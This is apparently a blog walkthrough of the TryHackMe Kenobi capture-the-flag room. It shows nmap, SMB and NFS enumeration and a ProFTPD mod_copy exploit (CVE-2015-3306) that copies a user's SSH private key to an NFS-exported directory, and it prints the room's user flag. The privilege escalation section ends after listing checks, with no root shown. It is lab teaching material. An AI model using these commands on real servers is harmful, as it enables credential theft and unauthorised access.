
---
title: "TryHackMe - Kenobi CTF Walkthrough"
date: 2024-12-18
categories: [TryHackMe]
tags: [CTF, FTP, NFS, Privilege Escalation, CVE-2015-3306]
image: /assets/images/thm-cover/kenobi-cover.jpg
---

# TryHackMe: Kenobi Room Walkthrough

## Room Overview
**Room Name:** Kenobi  
**Difficulty:** Easy  
**Objective:** Exploit the target machine and obtain the user and root flags.

---

## Table of Contents
- [Reconnaissance](#reconnaissance)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Privilege Escalation](#privilege-escalation)
- [Conclusion](#conclusion)

---

## Reconnaissance

### 1. Nmap Scan
The first step was to scan the machine for open ports and services.

```bash
nmap -v -sCV -oN nmap.txt $IP
```

**Open Ports:**
- 21/tcp - FTP (ProFTPD 1.3.5)
- 22/tcp - SSH (OpenSSH 7.2p2 Ubuntu 4ubuntu2.7)
- 80/tcp - HTTP (Apache 2.4.18)
- 139/tcp - NetBIOS-SSN (Samba)
- 445/tcp - NetBIOS-SSN (Samba)
- 2049/tcp - NFS (Network File System)

---

## Enumeration

### 2. SMB Enumeration
We found several SMB shares that are accessible.

```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse -oN nmapenum.txt $IP
```

Key findings:
- **\\10.10.140.79\anonymous** - Read/Write access
- **\\10.10.140.79\IPC$** - Read/Write access

You can connect to the `anonymous` share using `smbclient`:

```bash
smbclient //$IP/anonymous -N
ls
```

### 3. NFS Enumeration
The NFS (Network File System) was also exposed, and `/var` was found to be mounted:

```bash
nmap -p 111 --script=nfs-ls,nfs-showmount -oN nmap-port111.txt $IP
```

**NFS Share Found:**
- `/var` directory was exportable.

---

## Exploitation

### 4. ProFTPD Exploit (CVE-2015-3306)
The FTP service (ProFTPD 1.3.5) was vulnerable to a command injection vulnerability that allowed us to copy the SSH private key (`id_rsa`) from the user's home directory.

```bash
nc $IP 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

### 5. Mount NFS Share
Once the SSH private key was copied, I mounted the `/var` directory using NFS to retrieve the `id_rsa` file.

```bash
sudo mkdir /mnt/kenobiNFS
sudo mount $IP:/var /mnt/kenobiNFS
```

Navigate to the directory where the SSH key was copied:
```bash
cd /mnt/kenobiNFS/tmp
```

### 6. SSH Access as `kenobi`
After retrieving the `id_rsa` key, I set the correct permissions and used it to SSH into the target machine as the `kenobi` user.

```bash
chmod 600 id_rsa
ssh -i id_rsa kenobi@$IP
```

### 7. User Flag
Once inside the machine as `kenobi`, I found the `user.txt` flag.

```bash
kenobi@kenobi:~$ ls
share  user.txt

kenobi@kenobi:~$ cat user.txt
d0b0f3f53b6caa532a83915e19224899
```

---

## Privilege Escalation

### 8. Checking `sudo` Permissions
After gaining access as `kenobi`, I checked if the user had any special `sudo` permissions.

```bash
sudo -l
```

Unfortunately, no direct sudo privileges were granted, so I continued to search for other methods of privilege escalation.

### 9. Searching for SUID Binaries
I searched for binaries with the SUID bit set that could be exploited to gain root access.

```bash
find / -perm -u=s -type f 2>/dev/null
```

### 10. Cron Jobs and System Misconfigurations
I checked for scheduled cron jobs and other misconfigurations that might be leveraged for privilege escalation:

```bash
cat /etc/crontab
```

---

## Conclusion

In this room, I was able to:
1. Perform enumeration on FTP, SMB, HTTP, and NFS services.
2. Exploit a vulnerability in ProFTPD to extract an SSH private key.
3. Use the NFS share to retrieve the `id_rsa` key and SSH into the target machine.
4. Successfully obtain the `user.txt` flag.

The room provided a comprehensive understanding of service enumeration, exploitation of file transfer protocols, and privilege escalation paths.

---

### Flags Obtained:
- **User Flag:** `d0b0f3f53b6caa532a83915e19224899`

---

### References:
- [ProFTPD CVE-2015-3306](https://www.exploit-db.com/exploits/36803)
- TryHackMe Kenobi Room
